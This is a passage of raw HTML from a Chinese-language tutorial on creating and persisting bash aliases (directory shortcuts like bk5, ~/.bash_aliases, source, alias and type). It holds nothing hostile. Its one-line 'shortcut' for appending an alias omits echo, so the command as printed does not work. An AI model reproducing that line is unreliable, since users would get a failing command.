data-line=\"crayon-594b21ef37fd1248643362-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fd1248643362-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fd1248643362-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fd1248643362-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fd1248643362-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fd1248643362-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fd1248643362-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">bk1</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"cd ..\"</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fd1248643362-2\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">bk2</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"cd ../..\"</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b21ef37fd1248643362-3\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">bk3</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"cd ../../..\"</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fd1248643362-4\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">bk4</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"cd ../../../..\"</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-594b21ef37fd1248643362-5\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">bk5</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"cd ../../../../..\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fd1248643362-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>现在无论你什么时候想从当前工作目录往回走，例如说 5 个目录，你只需要运行下面的命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fd6545210662\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbk5\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fd6545210662-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fd6545210662-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fd6545210662-1\"><span class=\"crayon-i\">bk5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fd6545210662-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>现在这不是很简单吗？</p>\n<h3 id=\"toc_2\">相关细节</h3>\n<p>尽管当前我们在 shell 中用于定义别名的技术（通过使用 alias 命令）实现了效果，别名只存在于当前终端会话。很有可能你会希望你定义的别名能保存下来，使得此后你可以在任何新启动的命令行窗口/标签页中使用它们。</p>\n<p>为此，你需要在 <code>~/.bash_aliases</code> 文件中定义你的别名，你的 <code>~/.bashrc</code> 文件默认会加载该文件（如果你使用更早版本的 Ubuntu，我没有验证过是否有效）。</p>\n<p>下面是我的 <code>.bashrc</code> 文件中关于 <code>.bash_aliases</code> 文件的部分：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fda884421041\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# Alias definitions.\r\n# You may want to put all your additions into a separate file like\r\n# ~/.bash_aliases, instead of adding them here directly.\r\n# See /usr/share/doc/bash-doc/examples in the bash-doc package.\r\n\r\nif [ -f ~/.bash_aliases ]; then \r\n      . ~/.bash_aliases\r\nfi\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fda884421041-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fda884421041-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fda884421041-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fda884421041-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fda884421041-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fda884421041-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fda884421041-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fda884421041-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fda884421041-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fda884421041-1\"><span class=\"crayon-p\"># Alias definitions.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fda884421041-2\"><span class=\"crayon-p\"># You may want to put all your additions into a separate file like</span></div><div class=\"crayon-line\" id=\"crayon-594b21ef37fda884421041-3\"><span class=\"crayon-p\"># ~/.bash_aliases, instead of adding them here directly.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fda884421041-4\"><span class=\"crayon-p\"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span></div><div class=\"crayon-line\" id=\"crayon-594b21ef37fda884421041-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fda884421041-6\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bash</span><span class=\"crayon-sy\">_</span>aliases<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-594b21ef37fda884421041-7\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bash_aliases</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fda884421041-8\"><span class=\"crayon-i\">fi</span></div><div class=\"crayon-line\" id=\"crayon-594b21ef37fda884421041-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>一旦你把别名定义添加到你的 <code>.bash_aliases</code> 文件，该别名在任何新终端中都可用。但是，在任何其它你定义别名时已经启动的终端中，你还不能使用它们 – 解决办法是在这些终端中重新加载 <code>.bashrc</code>。下面就是你需要执行的具体命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fde835645783\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsource ~/.bashrc\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fde835645783-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fde835645783-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fde835645783-1\"><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">bashrc</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fde835645783-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>如果你觉得这要做的也太多了（是的，我期待你有更懒惰的办法），那么这里有一个快捷方式来做到这一切：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fe1589096911\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\"alias [the-alias]\" &gt;&gt; ~/.bash_aliases &amp;&amp; source ~/.bash_aliases\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fe1589096911-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fe1589096911-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fe1589096911-1\"><span class=\"crayon-s\">\"alias [the-alias]\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bash_aliases</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bash</span><span class=\"crayon-sy\">_</span>aliases</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fe1589096911-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>毫无疑问，你需要用实际的命令替换 <code>[the-alias]</code>。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fe4127501474\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\"alias bk5='cd ../../../../..'\" &gt;&gt; ~/.bash_aliases &amp;&amp; source ~/.bash_aliases\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fe4127501474-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fe4127501474-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fe4127501474-1\"><span class=\"crayon-s\">\"alias bk5='cd ../../../../..'\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bash_aliases</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bash</span><span class=\"crayon-sy\">_</span>aliases</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fe4127501474-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>接下来，假设你已经创建了一些别名，并时不时使用它们有一段时间了。突然有一天，你发现它们其中的一个并不像期望的那样。因此你觉得需要查看被赋予该别名的真正命令。你会怎么做呢？</p>\n<p>当然，你可以打开你的 <code>.bash_aliases</code> 文件在那里看看，但这种方式可能有点费时，尤其是当文件中包括很多别名的时候。因此，如果你正在查找一种更简单的方式，这就有一个：你需要做的只是运行 <code>alias</code> 命令并把别名名称作为参数。</p>\n<p>这里有个例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fe8553958061\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ alias bk6\r\nalias bk6='cd ../../../../../..'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fe8553958061-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fe8553958061-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fe8553958061-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fe8553958061-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">alias </span><span class=\"crayon-e\">bk6</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fe8553958061-2\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">bk6</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'cd ../../../../../..'</span></div><div class=\"crayon-line\" id=\"crayon-594b21ef37fe8553958061-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你可以看到，上面提到的命令显示了被赋值给别名 <code>bk6</code> 的实际命令。这里还有另一种办法：使用 <code>type</code> 命令。下面是一个例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37feb316997894\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ type bk6\r\nbk6 is aliased to `cd ../../../../../..'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37feb316997894-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37feb316997894-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37feb316997894-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37feb316997894-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">type </span><span class=\"crayon-e\">bk6</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37feb316997894-2\"><span class=\"crayon-e\">bk6 </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">aliased </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-i\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span 